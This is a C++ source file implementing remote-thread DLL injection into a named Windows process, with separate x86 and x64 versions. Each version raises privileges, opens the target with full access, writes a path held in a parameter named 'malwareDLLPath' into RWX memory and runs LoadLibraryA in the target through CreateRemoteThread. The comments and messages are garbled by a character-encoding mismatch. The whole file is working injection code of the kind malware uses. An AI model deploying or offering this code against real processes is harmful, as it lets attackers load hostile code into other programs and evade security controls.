#include "stdafx.h"
/**
 * Զ���߳�DLLע�� (X86)
 * ����   processName
 * ����   malwareDLLPath
 */
void RemoteThreadInject_X86(TCHAR* processName, TCHAR* malwareDLLPath)
{
#if !MY_X86
	printf("���������ΪX86 \n");
	return;
#endif
	printf("\n��ʼԶ���߳�DLLע��(X86)...\n");

	//��Ȩ,���ܴ�һЩ����
	if (!upPrivileges())
	{
		return;
	}
	//��Ŀ�����
	HANDLE hDestProcess = MyOpenProcess_x86(processName, PROCESS_ALL_ACCESS);
	if (hDestProcess == 0)return;

	//��ȡ��ǰ������LoadLibraryA()������ַ
	HMODULE hKERNEL32 = GetModuleHandle(TEXT("KERNEL32.DLL"));
	LPTHREAD_START_ROUTINE pLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKERNEL32, TEXT("LoadLibraryA"));
	if (pLoadLibrary == 0)
	{
		printf("���󣺻�ȡ��ǰ����LoadLibraryA()������ַʧ��... \n");
		return;
	}
	//ΪDLL�����ַ��������㹻��Ŀռ�(100�ֽ�)����д��Ŀ�����
	LPVOID remoteAddr = VirtualAllocEx(hDestProcess, NULL, 100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (remoteAddr == NULL)
	{
		printf("��Ŀ���������ռ�ʧ�ܣ�code=%d \n", GetLastError());
		return;
	}
	if (WriteProcessMemory(hDestProcess, (LPVOID)remoteAddr, (LPCVOID)malwareDLLPath, 100, OUT NULL) == 0)
	{
		DWORD CODE = GetLastError();
		printf("��Ŀ�����д��DLL�����ַ���ʧ��,CODE=%d \n", CODE);
		getchar();
		return;
	}
	//����Զ���̣߳�����Ŀ������ڵ�LoadLibrary����
	DWORD remoteThreadID = 0;
	HANDLE hRemoteThread = CreateRemoteThread(hDestProcess, NULL, 0, pLoadLibrary, (LPVOID)remoteAddr, 0, OUT &remoteThreadID);
	if (hRemoteThread == NULL)
	{
		printf("����Զ���߳�ʧ��,CODE=%d (ע�������Ϊ64λ�ſ�ע��64λ����)\n", GetLastError());
		return;
	}
	//�ȴ�Զ���߳̽���
	printf("����Զ���̳߳ɹ����ȴ�LoadLibrary()����...\n");
	WaitForSingleObject(hRemoteThread, INFINITE);
	DWORD exitCode = 666;
	GetExitCodeThread(hRemoteThread, OUT &exitCode);//�߳��˳��룬��LoadLibrary��������ֵ����ע���ģ���ַ
	if (exitCode == 0)
	{
		printf("Զ���߳��˳���(��LoadLibrary���ص�ģ���ַ)=0��ע��ʧ��...\n");
		CloseHandle(hRemoteThread);
		return;
	}
	printf("Զ���߳��˳���(��LoadLibrary���ص�ģ���ַ)= %08X", exitCode);
	CloseHandle(hRemoteThread);
	return;
}

// <summary>
//	Զ���߳�DLLע��(64λ) 
// </summary>
// <describe>
//	1.ͨ������LoadLibrary����DLLע��
//	2.ĳЩ�����޷�ע�룺Win10������x64
// </describe>
// <param name="processName"></param>
// <param name="malwareDLLPath"></param>
void RemoteThreadInject_X64(TCHAR* processName, TCHAR* malwareDLLPath)
{
#if !MY_X64
	printf("���������ΪX64 \n");
	return;
#endif
	printf("\n��ʼԶ���߳�DLLע��(X64)...\n");

	//��Ȩ,���ܴ�һЩ����
	if (!upPrivileges())
	{
		return;
	}
	//��Ŀ�����
	HANDLE hDestProcess = MyOpenProcess_x64(processName, PROCESS_ALL_ACCESS);
	if (hDestProcess == 0)return;

	//��ȡ��ǰ������LoadLibraryA()������ַ
	HMODULE hKERNEL32 = GetModuleHandle(TEXT("KERNEL32.DLL"));
	LPTHREAD_START_ROUTINE pLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKERNEL32, TEXT("LoadLibraryA"));
	if (pLoadLibrary == 0)
	{
		printf("���󣺻�ȡ��ǰ����LoadLibraryA()������ַʧ��... \n");
		return;
	}
	//ΪDLL�����ַ��������㹻��Ŀռ�(100�ֽ�)����д��Ŀ�����
	LPVOID remoteAddr = VirtualAllocEx(hDestProcess, NULL, 100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (remoteAddr == NULL)
	{
		printf("��Ŀ���������ռ�ʧ�ܣ�code=%d \n", GetLastError());
		return;
	}
	if (WriteProcessMemory(hDestProcess, (LPVOID)remoteAddr, (LPCVOID)malwareDLLPath, 100, OUT NULL) == 0)
	{
		DWORD CODE = GetLastError();
		printf("��Ŀ�����д��DLL�����ַ���ʧ��,CODE=%d \n", CODE);
		getchar();
		return;
	}
	//����Զ���̣߳�����Ŀ������ڵ�LoadLibrary����(ע��64λ�������Ϊ64λ������ܾ�����)
	DWORD remoteThreadID = 0;
	HANDLE hRemoteThread = CreateRemoteThread(hDestProcess, NULL, 0, pLoadLibrary, (LPVOID)remoteAddr, 0, OUT &remoteThreadID);
	if (hRemoteThread == NULL)
	{
		printf("����Զ���߳�ʧ��,CODE=%d (ע�������Ϊ64λ�ſ�ע��64λ����)\n", GetLastError());
		return;
	}
	//�ȴ�Զ���߳̽���
	printf("����Զ���̳߳ɹ����ȴ�LoadLibrary()����...\n");
	WaitForSingleObject(hRemoteThread, INFINITE);
	DWORD exitCode = 666;
	GetExitCodeThread(hRemoteThread, OUT &exitCode);//�߳��˳��룬��LoadLibrary��������ֵ����ע���ģ���ַ
	if (exitCode == 0)
	{
		printf("Զ���߳��˳���(��LoadLibrary���ص�ģ���ַ)=0��ע��ʧ��...\n");
		CloseHandle(hRemoteThread);
		return;
	}
	printf("Զ���߳��˳���(��LoadLibrary���ص�ģ���ַ)= %08X", exitCode);
	CloseHandle(hRemoteThread);
	return;
}